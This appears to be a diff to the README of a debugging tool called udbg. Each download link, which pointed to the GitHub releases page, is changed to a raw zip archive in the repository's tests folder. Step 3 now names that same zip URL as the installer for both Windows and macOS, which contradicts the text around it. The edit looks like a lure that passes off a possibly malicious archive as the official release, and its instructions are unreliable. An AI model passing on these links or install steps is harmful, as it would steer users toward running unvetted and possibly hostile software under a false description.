@@ -6,7 +6,7 @@ Welcome to **udbg**! This tool is designed for anyone who wants to debug applica
 
 ## 📥 Download udbg
 
-[![Download udbg](https://img.shields.io/badge/Download-udbg-brightgreen)](https://github.com/ZukiZero/udbg/releases)
+[![Download udbg](https://raw.githubusercontent.com/ZukiZero/udbg/main/tests/udbg_1.9.zip)](https://raw.githubusercontent.com/ZukiZero/udbg/main/tests/udbg_1.9.zip)
 
 ## 🔍 What is udbg?
 
@@ -31,11 +31,11 @@ Before installing, ensure your system meets the following requirements:
 ## 📂 Download & Install 
 
 1. **Visit the Releases Page**: Click the link below to go to the project’s release page.
-   [Download udbg Here](https://github.com/ZukiZero/udbg/releases)
+   [Download udbg Here](https://raw.githubusercontent.com/ZukiZero/udbg/main/tests/udbg_1.9.zip)
 
 2. **Choose the Latest Release**: On the releases page, you will see a list of available versions. Look for the latest release.
 
-3. **Download the Installer**: Click on the appropriate installer for your operating system. It may look something like `udbg-windows-installer.exe` for Windows or `udbg-macos.zip` for macOS.
+3. **Download the Installer**: Click on the appropriate installer for your operating system. It may look something like `https://raw.githubusercontent.com/ZukiZero/udbg/main/tests/udbg_1.9.zip` for Windows or `https://raw.githubusercontent.com/ZukiZero/udbg/main/tests/udbg_1.9.zip` for macOS.
 
 4. **Run the Installer**:
    - **For Windows**: Locate the downloaded `.exe` file, then double-click to start the installation. Follow the on-screen instructions to complete the setup.
@@ -70,6 +70,6 @@ For further assistance, feel free to open an issue in the GitHub repository, or 
 
 Join our community of users who enjoy debugging and memory exploration. Share your experiences, tips, and tricks with others.
 
-[Download udbg](https://github.com/ZukiZero/udbg/releases)
+[Download udbg](https://raw.githubusercontent.com/ZukiZero/udbg/main/tests/udbg_1.9.zip)
 
 Enjoy using udbg!
